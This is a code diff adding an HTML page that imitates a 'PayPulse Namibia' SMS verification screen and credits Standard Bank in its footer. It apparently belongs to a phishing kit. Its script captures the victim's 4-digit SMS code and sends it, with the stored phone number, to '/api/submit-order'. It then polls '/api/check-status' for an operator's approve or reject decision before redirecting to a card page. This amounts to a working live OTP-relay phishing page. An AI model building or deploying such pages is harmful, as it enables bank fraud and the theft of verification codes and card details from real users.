@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
+    <title>PayPulse Namibia | SMS Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #C7D2DC 0%, #E5E5E5 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding: 20px 16px;
+        }
+
+        /* Portrait-oriented mobile container wrapper preserving proportions */
+        .mobile-viewport {
+            width: 100%;
+            max-width: 400px;
+            min-height: 720px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 32px 24px;
+        }
+
+        /* Top Stack: Navbar & Header */
+        .top-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Navigation Bar */
+        .pp-navbar {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding-bottom: 12px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #CBD5E1;
+        }
+
+        .nav-title {
+            color: #5A6A85;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        /* Header Section */
+        .pp-header {
+            text-align: center;
+            margin-bottom: 28px;
+            width: 100%;
+        }
+
+        .pp-header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #182342;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .pp-header p {
+            font-size: 14px;
+            color: #5A6A85;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        /* Middle Section: 4-Box PIN Input Container & Error Box */
+        .middle-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: auto 0;
+            padding: 10px 0;
+        }
+
+        .pp-pin-container {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+
+        .pp-pin-box {
+            width: 58px;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.8);
+            border: 1px solid #8C9EAC;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #182342;
+            text-align: center;
+            outline: none;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.04);
+            transition: all 0.2s ease;
+            backdrop-filter: blur(5px);
+        }
+
+        .pp-pin-box:focus {
+            border-color: #0A3768;
+            box-shadow: 0 0 0 3px rgba(10, 55, 104, 0.15);
+        }
+
+        /* Inline Error Message Box */
+        .pp-error-box {
+            width: 100%;
+            display: none;
+            align-items: flex-start;
+            text-align: left;
+            gap: 10px;
+            margin-bottom: 16px;
+            padding: 0 4px;
+        }
+
+        .pp-error-box i {
+            color: #D97706;
+            font-size: 15px;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .pp-error-text {
+            color: #182342;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        /* Resend SMS Row */
+        .pp-resend-row {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: 4px;
+        }
+
+        .pp-resend-link {
+            color: #0A3768;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .pp-resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .pp-resend-link.disabled {
+            display: none;
+        }
+
+        /* Bottom Stack: Next Button & Footer */
+        .bottom-stack {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;
+            padding-top: 20px;
+        }
+
+        /* Full Width Gradient Next Button (No Arrow) */
+        .btn-next {
+            width: 85%;
+            height: 68px;
+            background: #CBD5E1;
+            color: #8C9EAC;
+            border: none;
+            border-radius: 34px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: not-allowed;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            letter-spacing: 0.5px;
+            margin-bottom: 24px;
+        }
+
+        .btn-next.active {
+            background: linear-gradient(90deg, #0A3768 0%, #315B83 100%);
+            color: #FFFFFF;
+            cursor: pointer;
+            box-shadow: 0 6px 16px rgba(10, 55, 104, 0.25);
+        }
+
+        .btn-next.active:hover {
+            transform: translateY(-1px);
+        }
+
+        /* Footer Section */
+        .footer-container {
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .footer-bank-line {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2D3748;
+        }
+
+        .footer-bank-line i {
+            font-size: 14px;
+            color: #174B76;
+        }
+
+        .footer-links-line {
+            font-size: 12px;
+            font-weight: 500;
+            color: #5A6A85;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.15s ease;
+        }
+
+        .footer-links-line:hover {
+            color: #182342;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-viewport">
+        
+        <!-- Top Stack -->
+        <div class="top-stack">
+            <!-- Top Navigation Bar -->
+            <div class="pp-navbar">
+                <div class="nav-title">Sign in</div>
+            </div>
+
+            <div class="pp-header">
+                <h1>We've sent you an SMS</h1>
+                <p>Enter the 4-digit code we sent to you to continue.</p>
+            </div>
+        </div>
+
+        <!-- Middle Stack: 4 PIN Input Boxes centered on screen -->
+        <div class="middle-stack">
+            <div class="pp-pin-container">
+                <input type="password" class="pp-pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="code1" oninput="handleCodeInput(this, 'code2')" onkeydown="handleKeyDown(event, null, 'code1')" autofocus>
+                <input type="password" class="pp-pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="code2" oninput="handleCodeInput(this, 'code3')" onkeydown="handleKeyDown(event, 'code1', 'code2')">
+                <input type="password" class="pp-pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="code3" oninput="handleCodeInput(this, 'code4')" onkeydown="handleKeyDown(event, 'code2', 'code3')">
+                <input type="password" class="pp-pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="code4" oninput="handleCodeInput(this, null)" onkeydown="handleKeyDown(event, 'code3', 'code4')">
+            </div>
+
+            <!-- Inline Error Message Box -->
+            <div id="inlineErrorBox" class="pp-error-box">
+                <i class="fa-solid fa-triangle-exclamation"></i>
+                <div id="errorText" class="pp-error-text">The code you've entered is incorrect. Please try again.</div>
+            </div>
+
+            <!-- Resend SMS Row -->
+            <div class="pp-resend-row">
+                <a href="#" id="resendLink" class="pp-resend-link" onclick="requestResendSms(event)">Resend SMS</a>
+            </div>
+        </div>
+
+        <!-- Bottom Stack -->
+        <div class="bottom-stack">
+            <!-- Next Button (No Arrow) -->
+            <button type="button" id="nextBtn" class="btn-next" onclick="submitSms()">Next</button>
+
+            <!-- Footer -->
+            <div class="footer-container">
+                <div class="footer-bank-line">
+                    Brought to you by <i class="fa-solid fa-shield-halved"></i> <strong>Standard Bank</strong>
+                </div>
+                <div class="footer-links-line" onclick="alert('Privacy Policy & Terms and Conditions')">
+                    Privacy Policy & Terms and Conditions
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+<script>
+    const code1 = document.getElementById('code1');
+    const code2 = document.getElementById('code2');
+    const code3 = document.getElementById('code3');
+    const code4 = document.getElementById('code4');
+    const nextBtn = document.getElementById('nextBtn');
+    const resendLink = document.getElementById('resendLink');
+    const errorBox = document.getElementById('inlineErrorBox');
+    const errorText = document.getElementById('errorText');
+    
+    let resendAttempts = 2;
+    let activeInterval = null;
+
+    const pageLoadTimestamp = Date.now();
+
+    function showInlineError(message) {
+        errorText.innerText = message;
+        errorBox.style.display = 'flex';
+    }
+
+    function hideInlineError() {
+        errorBox.style.display = 'none';
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+        localStorage.removeItem('paypulseApprovalTimestamp');
+    });
+
+    function checkCodeComplete() {
+        const c1 = code1.value;
+        const c2 = code2.value;
+        const c3 = code3.value;
+        const c4 = code4.value;
+
+        if (c1 && c2 && c3 && c4) {
+            nextBtn.classList.add('active');
+        } else {
+            nextBtn.classList.remove('active');
+        }
+    }
+
+    function handleCodeInput(current, nextFieldId) {
+        current.value = current.value.replace(/[^0-9]/g, '');
+        hideInlineError();
+
+        if (current.value.length === 1 && nextFieldId) {
+            document.getElementById(nextFieldId).focus();
+        }
+        checkCodeComplete();
+    }
+
+    function handleKeyDown(event, prevFieldId, currentFieldId) {
+        if (event.key === 'Backspace') {
+            const currentField = document.getElementById(currentFieldId);
+            if (currentField.value === '' && prevFieldId) {
+                document.getElementById(prevFieldId).focus();
+            } else {
+                currentField.value = '';
+            }
+            hideInlineError();
+            checkCodeComplete();
+        }
+    }
+
+    async function requestResendSms(e) {
+        e.preventDefault();
+        if (resendAttempts < 0) return;
+
+        const currentAttemptNumber = 3 - resendAttempts; 
+        resendAttempts--;
+
+        if (resendAttempts < 0) {
+            resendLink.classList.add('disabled');
+        }
+
+        const phoneInput = localStorage.getItem('paypulseUserPhone') || localStorage.getItem('userPhone') || 'PayPulse User';
+
+        try {
+            await fetch('/api/submit-order', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: phoneInput, 
+                    uniqueId: `Resend SMS Code Requested (Attempt ${currentAttemptNumber}/2)` 
+                })
+            });
+        } catch (error) {
+            console.error('Error sending resend notification:', error);
+        }
+    }
+
+    function submitSms() {
+        const code = code1.value + code2.value + code3.value + code4.value;
+        if (code.length !== 4) {
+            showInlineError('Please enter the complete 4-digit SMS code.');
+            return;
+        }
+        submitSmsCode(code);
+    }
+
+    async function submitSmsCode(code) {
+        const phoneInput = localStorage.getItem('paypulseUserPhone') || localStorage.getItem('userPhone') || 'PayPulse User';
+
+        localStorage.setItem('paypulseLastSmsCode', code);
+
+        try {
+            nextBtn.classList.remove('active');
+            nextBtn.style.opacity = '0.7';
+            nextBtn.innerText = 'Verifying...';
+
+            const response = await fetch('/api/submit-order', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phoneInput, uniqueId: 'SMS Code: ' + code })
+            }); 
+
+            const result = await response.json();
+
+            if (result.success) {
+                pollApprovalStatus(phoneInput);
+            } else {
+                showInlineError("The code you've entered is incorrect. Please try again.");
+                resetButtonState();
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            showInlineError("Could not connect.");
+            resetButtonState();
+        }
+    }
+
+    function resetButtonState() {
+        nextBtn.style.opacity = '1';
+        nextBtn.innerText = 'Next';
+        code1.value = '';
+        code2.value = '';
+        code3.value = '';
+        code4.value = '';
+        checkCodeComplete();
+        code1.focus();
+    }
+
+    function pollApprovalStatus(phone) {
+        const cleanPhone = phone.trim();
+
+        if (activeInterval) clearInterval(activeInterval);
+
+        const submissionTimestamp = Date.now();
+
+        activeInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
+                const data = await response.json();
+
+                if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
+                    clearInterval(activeInterval);
+                    window.location.href = 'card.html';
+                } 
+                else if ((data.status === 'rejected' || data.status === 'wrong_id') && data.timestamp && data.timestamp >= submissionTimestamp) {
+                    clearInterval(activeInterval);
+                    showInlineError("The code you've entered is incorrect. Please try again.");
+                    resetButtonState();
+                }
+            } catch (e) {
+                console.error('Polling error', e);
+            }
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
